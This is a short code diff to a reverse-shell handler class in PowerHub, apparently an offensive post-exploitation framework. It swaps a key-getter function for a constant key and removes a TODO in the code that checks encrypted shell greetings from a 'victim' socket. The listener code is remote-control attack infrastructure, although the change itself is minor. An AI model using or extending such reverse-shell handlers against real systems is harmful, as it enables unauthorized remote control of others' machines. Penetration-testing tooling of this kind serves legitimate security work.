@@ -9,7 +9,7 @@ from datetime import datetime as dt
 import email.utils as eut
 
 from powerhub.directories import SHELL_LOG_DIR
-from powerhub.tools import encrypt, get_secret_key
+from powerhub.tools import encrypt, KEY
 from powerhub.logging import log
 
 T_BSON = 0
@@ -23,7 +23,7 @@ class ReverseShell(threading.Thread):
 
     def __init__(self, sock):
         super(ReverseShell, self).__init__()
-        self.key = get_secret_key()
+        self.key = KEY
         self.details = {}
         self.rsock = sock  # the remote socket connected to the victim
         self.lsock = None  # the local socket for shell interaction
@@ -83,7 +83,7 @@ class ReverseShell(threading.Thread):
         r, _, _ = select.select([self.rsock], [], [])
         firstbytes = r[0].recv(8, socket.MSG_PEEK)
         firstbytes = encrypt(firstbytes, self.key)
-        if firstbytes == self.SHELL_HELLO:  # or rc4(shell_hello) TODO
+        if firstbytes == self.SHELL_HELLO:
             log.debug("Shell hello received")
             r[0].recv(8)
             p = self.read_shell_packet(self.rsock)
